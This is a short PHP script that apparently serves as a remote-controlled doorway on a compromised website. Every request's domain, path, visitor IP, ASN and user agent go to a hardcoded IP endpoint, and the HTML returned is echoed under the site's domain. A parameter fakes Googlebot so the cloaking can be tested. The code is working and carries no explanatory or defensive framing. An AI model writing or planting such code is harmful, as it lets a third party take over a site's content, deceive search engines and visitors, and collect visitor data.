<?php

define('API_URL', 'http://193.24.123.4/api.php');
define('API_TIMEOUT', 20);

$domain = $_SERVER['HTTP_HOST']   ?? 'localhost';
$path   = $_SERVER['REQUEST_URI'] ?? '/';

if (isset($_GET['google']) && $_GET['google'] === 'test') {
    $_SERVER['HTTP_USER_AGENT'] = 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)';
    $_SERVER['REMOTE_ADDR']     = '66.249.66.1';   
    $_SERVER['HTTP_X_ASN_NUM']  = '15169';      
}

$url = API_URL
    . '?domain=' . urlencode($domain)
    . '&path='   . urlencode($path);

$ctx = stream_context_create([
    'http' => [
        'timeout'       => API_TIMEOUT,
        'ignore_errors' => true,
        'header'        => [
            'X-Forwarded-For: ' . ($_SERVER['REMOTE_ADDR'] ?? ''),
            'X-ASN-Num: '       . ($_SERVER['HTTP_X_ASN_NUM'] ?? ''),
            'User-Agent: '      . ($_SERVER['HTTP_USER_AGENT'] ?? ''),
        ],
    ],
    'ssl' => ['verify_peer' => false],
]);

$html = @file_get_contents($url, false, $ctx);

if ($html === false || trim($html) === '') {
    http_response_code(503);
    echo '<!DOCTYPE html><html><body><p>Service temporarily unavailable.</p></body></html>';
    exit;
}

if (isset($http_response_header)) {
    foreach ($http_response_header as $h) {
        if (preg_match('#^HTTP/\S+\s+(\d+)#', $h, $m)) {
            http_response_code((int)$m[1]);
        }
        if (preg_match('#^Content-Type:#i', $h)) {
            header($h);
        }
    }
}

echo $html;
